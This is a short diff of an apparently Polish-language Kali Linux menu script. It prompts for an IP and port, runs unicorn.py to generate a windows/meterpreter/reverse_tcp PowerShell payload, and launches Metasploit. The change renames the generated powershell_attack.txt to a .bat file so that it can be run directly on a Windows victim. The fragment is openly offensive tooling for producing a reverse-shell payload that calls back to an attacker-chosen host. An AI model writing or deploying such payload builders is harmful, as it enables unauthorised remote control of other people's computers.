@@ -14,7 +14,7 @@ read IP
 echo "Podaj port ładunku ..."
 read PORT
 ./unicorn.py windows/meterpreter/reverse_tcp $IP $PORT
-mv /home/kali/Desktop/KOZ1OLMENU/unicorn/powershell_attack.txt /home/kali/Desktop
+mv /home/kali/Desktop/KOZ1OLMENU/unicorn/powershell_attack.txt /home/kali/Desktop/powershell_attack.bat
 cd /home/kali/Desktop
 echo "Czy mam uruchomić pakiet metasploit ? (Y/N)"
 read ODPOWIEDZ
